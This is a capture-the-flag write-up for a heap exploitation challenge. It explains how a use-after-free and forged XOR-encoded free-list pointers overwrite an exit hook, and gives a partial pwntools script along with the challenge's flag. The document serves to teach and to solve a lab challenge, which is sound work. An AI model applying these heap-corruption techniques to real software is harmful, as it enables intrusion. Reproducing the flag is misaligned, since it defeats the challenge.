# House of Mirror Reloaded

**Category:** PWN  
**Challenge Description:**

Sharper lights, and old rumors. The gallery has mirrors everywhere, but only one reflection is real.

Flag: `KOS{BE36FA6A55B14D1ABF7BB1C79DFA2092}`

## Analysis

A custom arena allocator with XOR-encoded free-list pointers (safe-linking style) and a calibration gadget. The gallery menu exposes: `cast` (alloc), `shatter` (free), `polish` (write to slot), `reflect` (read from slot), `calibrate`, and `leave` (calls exit hook).

Two decoys are printed by the "silvering report" option (menu item 6):
- `KOS{RELOADED_SILVERING_UNLOCK}`
- `KOS{test_local_flag}` (local env only)

The real flag comes from overwriting the exit hook at `0x405758` with `show_flag()` (`0x401522`) via a UAF + pointer forgery chain.

**Calibration:** `calibration_target = mix64(nonce XOR MAGIC) & 0xFFFF` where `MAGIC = 0xa51f00d5eed12345`. Submit `nonce XOR MAGIC` to pass.

**Key leak:** `reflect(slot=0)` leaks `chunk0.next XOR key0`. Since `chunk1 = ARENA0_BASE + 0x60` is known, recover `key0 = leaked XOR chunk1`.

**UAF chain:** shatter slot0 (frees chunk0 but `slots[0]` still points to it) → polish slot0 to write `TARGET_PTR XOR key0` as the fake next pointer → cast slot1 (pops chunk0) → cast slot2 (pops `TARGET_PTR = EXIT_HOOK - 8`) → polish slot2 to write `show_flag` at `EXIT_HOOK` → `leave()` triggers `show_flag()`.

## Solution

```python
from pwn import *
import re

ARENA0_BASE   = 0x405040
ARENA0_CHUNK1 = ARENA0_BASE + 0x60
EXIT_HOOK     = 0x405758
SHOW_FLAG     = 0x401522
TARGET_PTR    = EXIT_HOOK - 8
MAGIC         = 0xa51f00d5eed12345

def mix64(x):
    x &= 0xFFFFFFFFFFFFFFFF
    x ^= x >> 33; x = (x * 0xff51afd7ed558ccd) & 0xFFFFFFFFFFFFFFFF
    x ^= x >> 33; x = (x * 0xc4ceb9fe1a85ec53) & 0xFFFFFFFFFFFFFFFF
    x ^= x >> 33
    return x

r = remote('ctf.kosovacyber.team', 1341)
header = r.recvuntil(b'> ')
nonce  = int(re.search(rb'session nonce:\s+([0-9a-f]+)',     header).group(1), 16)
target = int(re.search(rb'calibration target:\s+([0-9a-f]+)', header).group(1), 16)

cal_val = nonce ^ MAGIC
assert mix64(cal_val) & 0xFFFF == target

# cast slot0, calibrate, reflect to leak key0
# shatter slot0 (UAF), polish fake next, cast slot1+slot2, polish EXIT_HOOK, leave
# ... (full exploit in exploit.py)

result = r.recvall(timeout=5)
print(result.decode(errors='replace'))
```
